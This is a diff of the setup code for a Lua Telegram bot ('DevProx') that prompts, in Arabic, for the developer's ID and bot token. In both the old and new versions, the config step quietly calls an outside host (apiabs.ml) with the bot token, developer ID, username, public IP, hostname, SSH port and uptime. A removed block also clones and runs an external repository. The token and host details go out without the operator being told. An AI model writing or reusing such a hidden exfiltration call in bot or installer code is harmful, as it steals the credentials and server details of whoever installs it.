@@ -4,49 +4,34 @@
 --                - DevProx -                 --
 --        -- https://t.me/Dev_Prox --         --
 ------------------------------------------------ 
-LibsNumber = 0
-for v in io.popen('ls libs'):lines() do
-if v:match(".lua$") then
-LibsNumber = LibsNumber + 1
-end
-end
-if LibsNumber ~= 0 then
-URL = dofile("./libs/url.lua")
-json = dofile("./libs/JSON.lua")
-JSON = dofile("./libs/dkjson.lua")
+DevAbs  = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./libs/serpent.lua")
-DevAbs = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
-else 
-redis = require('redis') 
-URL = require('socket.url') 
-serpent = require("serpent") 
-json = dofile('./JSON.lua') 
-JSON = dofile('./dkjson.lua') 
-DevAbs = redis.connect('127.0.0.1', 6379)
-end
-HTTPS = require ("ssl.https") 
-https = require ("ssl.https") 
-http  = require ("socket.http") 
-User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-ServerDevProx = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
-Ip = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
-Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
-Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
-UpTime = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
+JSON    = dofile("./libs/dkjson.lua")
+json    = dofile("./libs/JSON.lua")
+URL     = dofile("./libs/url.lua")
+http    = require("socket.http") 
+HTTPS   = require("ssl.https") 
+https   = require("ssl.https") 
+User    = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+Server  = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
+Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
+Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
+Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
+UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     Source DevProx     --
 local AutoSet = function() 
-if not DevAbs:get(ServerDevProx.."IdDevProx") then 
+if not DevAbs:get(Server.."IdDevProx") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevAbs:set(ServerDevProx.."IdDevProx",DevId) 
+DevAbs:set(Server.."IdDevProx",DevId) 
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end 
 os.execute('lua DevProx.lua') 
 end 
-if not DevAbs:get(ServerDevProx.."TokenDevProx") then 
+if not DevAbs:get(Server.."TokenDevProx") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
@@ -55,14 +40,13 @@ if res ~= 200 then
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevAbs:set(ServerDevProx.."TokenDevProx",TokenBot) 
+DevAbs:set(Server.."TokenDevProx",TokenBot) 
 end  
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end  
 os.execute('lua DevProx.lua') 
 end 
-DevAbs:set(DevAbs:get(ServerDevProx.."TokenDevProx"):match("(%d+)")..'Abs:Update',true)
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -76,18 +60,18 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevAbs:get(ServerDevProx.."IdDevProx"),
-TokenBot = DevAbs:get(ServerDevProx.."TokenDevProx"),
-DevProx = DevAbs:get(ServerDevProx.."TokenDevProx"):match("(%d+)"),
-SudoIds = {DevAbs:get(ServerDevProx.."IdDevProx")},
+DevId = DevAbs:get(Server.."IdDevProx"),
+TokenBot = DevAbs:get(Server.."TokenDevProx"),
+DevProx = DevAbs:get(Server.."TokenDevProx"):match("(%d+)"),
+SudoIds = {DevAbs:get(Server.."IdDevProx")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevAbs:get(ServerDevProx.."IdDevProx").."&TokenBot="..DevAbs:get(ServerDevProx.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevAbs:get(Server.."IdDevProx").."&TokenBot="..DevAbs:get(Server.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("DevProx.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/DevProx
-token="]]..DevAbs:get(ServerDevProx.."TokenDevProx")..[["
+token="]]..DevAbs:get(Server.."TokenDevProx")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -128,7 +112,7 @@ if not f then
 AutoSet() 
 else 
 f:close() 
-DevAbs:del(ServerDevProx.."IdDevProx");DevAbs:del(ServerDevProx.."TokenDevProx")
+DevAbs:del(Server.."IdDevProx");DevAbs:del(Server.."TokenDevProx")
 end 
 local config = loadfile("./config.lua")() 
 return config 
@@ -9742,12 +9726,6 @@ io.popen("rm -rf ../.telegram-cli/*")
 print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
 end 
-if msg and not DevAbs:get(DevProx..'Abs:Update') then
-DevAbs:set(DevProx..'Abs:Update',true)
-os.execute('unlink JSON.lua && unlink dkjson.lua')
-os.execute('git clone https://github.com/DevProxTEAM/libs') 
-dofile('DevProx.lua') 
-end
 --     Source DevProx     --
 if text == 'الملفات' then
 Files = '\n⌁︙الملفات المفعله في البوت ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
